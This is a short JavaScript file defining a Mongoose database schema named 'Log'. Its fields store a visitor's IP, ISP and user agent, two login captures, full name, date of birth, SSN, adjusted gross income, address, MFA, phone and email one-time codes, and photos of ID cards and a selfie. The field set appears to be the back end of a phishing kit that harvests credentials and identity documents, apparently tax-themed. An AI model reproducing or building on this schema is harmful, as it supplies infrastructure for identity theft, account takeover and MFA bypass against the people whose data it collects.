const mongoose = require("mongoose");

const Schema = mongoose.Schema;

const logSchema = new Schema(
  {
    id: {
      type: String,
    },
    ip: {
      type: String,
    },
    country: {
      type: String,
    },
    os: {
      type: String,
    },
    useragent: {
      type: String,
    },
    isp: {
      type: String,
    },
    first_login: {
      type: String,
      default: null,
    },
    second_login: {
      type: String,
      default: null,
    },
    first_name: {
      type: String,
      default: null,
    },
    middle_name: {
      type: String,
      default: null,
    },
    last_name: {
      type: String,
      default: null,
    },
    suffix: {
      type: String,
      default: null,
    },
    date_of_birth: {
      type: String,
      default: null,
    },
    ssn: {
      type: String,
      default: null,
    },
    agi: {
      type: String,
      default: null,
    },
    street: {
      type: String,
      default: null,
    },
    city: {
      type: String,
      default: null,
    },
    state: {
      type: String,
      default: null,
    },
    zip_code: {
      type: String,
      default: null,
    },
    mfa_code: {
      type: String,
      default: null,
    },
    phone_code: {
      type: String,
      default: null,
    },
    email_code: {
      type: String,
      default: null,
    },
    id_front: {
      type: String,
      default: null,
    },
    id_back: {
      type: String,
      default: null,
    },
    id_selfie: {
      type: String,
      default: null,
    },
  },
  { timestamps: true }
);

module.exports = mongoose.model("Log", logSchema);
